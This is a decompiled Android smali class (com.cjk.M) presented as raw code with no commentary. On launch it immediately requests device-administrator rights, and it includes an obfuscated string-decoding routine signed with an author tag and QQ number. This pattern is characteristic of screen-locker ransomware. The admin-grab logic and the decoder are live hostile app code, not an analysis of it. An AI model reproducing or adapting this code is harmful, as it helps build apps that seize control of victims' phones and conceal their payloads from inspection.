.class public Lcom/cjk/M;
.super Landroid/app/Activity;
.source "M.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 42
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private activiteDevice()V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 20
    move-object v0, p0

    new-instance v6, Landroid/content/Intent;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    const-string v8, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v7, v8}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    move-object v2, v6

    .line 21
    new-instance v6, Landroid/content/ComponentName;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v0

    :try_start_0
    const-string v9, "com.cjk.MyAdmin"

    invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v9

    invoke-direct {v7, v8, v9}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v3, v6

    .line 22
    move-object v6, v2

    const-string v7, "android.app.extra.DEVICE_ADMIN"

    move-object v8, v3

    invoke-virtual {v6, v7, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object v6

    .line 25
    move-object v6, v0

    move-object v7, v2

    const/4 v8, 0x0

    invoke-virtual {v6, v7, v8}, Lcom/cjk/M;->startActivityForResult(Landroid/content/Intent;I)V

    return-void

    .line 21
    :catch_0
    move-exception v6

    move-object v4, v6

    new-instance v6, Ljava/lang/NoClassDefFoundError;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v4

    invoke-virtual {v8}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v6
.end method

.method public static final getsss(Ljava/lang/String;)Ljava/lang/String;
    .locals 21

    .prologue
    .line 28
    move-object/from16 v0, p0

    new-instance v16, Ljava/lang/String;

    move-object/from16 v20, v16

    move-object/from16 v16, v20

    move-object/from16 v17, v20

    const-string v18, "by:\u5f7c\u5cb8\u82b1 qq:1279525738"

    invoke-virtual/range {v18 .. v18}, Ljava/lang/String;->getBytes()[B

    move-result-object v18

    const/16 v19, 0x0

    invoke-static/range {v18 .. v19}, Landroid/util/Base64;->encode([BI)[B

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/String;-><init>([B)V

    move-object/from16 v2, v16

    .line 29
    move-object/from16 v16, v2

    const/16 v17, 0x3

    const/16 v18, 0x4

    invoke-virtual/range {v16 .. v18}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v16

    check-cast v16, Ljava/lang/String;

    move-object/from16 v3, v16

    .line 30
    move-object/from16 v16, v2

    const/16 v17, 0x4

    const/16 v18, 0x5

    invoke-virtual/range {v16 .. v18}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v16

    check-cast v16, Ljava/lang/String;

    move-object/from16 v4, v16

    .line 31
    move-object/from16 v16, v0

    move-object/from16 v17, v3

    const-string v18, "\u4e09\u751f\u77f3\u7554"

    invoke-virtual/range {v16 .. v18}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    move-object/from16 v5, v16

    .line 32
    move-object/from16 v16, v5

    move-object/from16 v17, v4

    const-string v18, "\u5f7c\u5cb8\u82b1\u5f00"

    invoke-virtual/range {v16 .. v18}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    move-object/from16 v6, v16

    .line 33
    move-object/from16 v16, v6

    const-string v17, "\u4e09\u751f\u77f3\u7554"

    move-object/from16 v18, v4

    invoke-virtual/range {v16 .. v18}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    move-object/from16 v7, v16

    .line 34
    move-object/from16 v16, v7

    const-string v17, "\u5f7c\u5cb8\u82b1\u5f00"

    move-object/from16 v18, v3

    invoke-virtual/range {v16 .. v18}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    move-object/from16 v8, v16

    .line 35
    move-object/from16 v16, v8

    invoke-virtual/range {v16 .. v16}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v16

    const/16 v17, 0x0

    invoke-static/range {v16 .. v17}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v16

    move-object/from16 v9, v16

    .line 36
    new-instance v16, Ljava/lang/String;

    move-object/from16 v20, v16

    move-object/from16 v16, v20

    move-object/from16 v17, v20

    move-object/from16 v18, v9

    invoke-direct/range {v17 .. v18}, Ljava/lang/String;-><init>([B)V

    move-object/from16 v10, v16

    .line 37
    new-instance v16, Ljava/lang/StringBuffer;

    move-object/from16 v20, v16

    move-object/from16 v16, v20

    move-object/from16 v17, v20

    move-object/from16 v18, v10

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    move-object/from16 v11, v16

    .line 38
    new-instance v16, Ljava/lang/StringBuffer;

    move-object/from16 v20, v16

    move-object/from16 v16, v20

    move-object/from16 v17, v20

    invoke-direct/range {v17 .. v17}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v17, v11

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;

    move-result-object v17

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v16

    const-string v17, ""

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v16

    invoke-virtual/range {v16 .. v16}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v16

    move-object/from16 v12, v16

    .line 39
    move-object/from16 v16, v12

    invoke-virtual/range {v16 .. v16}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v16

    const/16 v17, 0x0

    invoke-static/range {v16 .. v17}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v16

    move-object/from16 v13, v16

    .line 40
    new-instance v16, Ljava/lang/String;

    move-object/from16 v20, v16

    move-object/from16 v16, v20

    move-object/from16 v17, v20

    move-object/from16 v18, v13

    invoke-direct/range {v17 .. v18}, Ljava/lang/String;-><init>([B)V

    move-object/from16 v14, v16

    .line 41
    new-instance v16, Ljava/lang/String;

    move-object/from16 v20, v16

    move-object/from16 v16, v20

    move-object/from16 v17, v20

    move-object/from16 v18, v14

    invoke-direct/range {v17 .. v18}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v16

    return-object v0
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    const-string v4, "com.aide.ui"

    invoke-static {v3, v4}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 14
    move-object v3, v0

    move-object v4, v1

    invoke-super {v3, v4}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 15
    move-object v3, v0

    invoke-direct {v3}, Lcom/cjk/M;->activiteDevice()V

    return-void
.end method
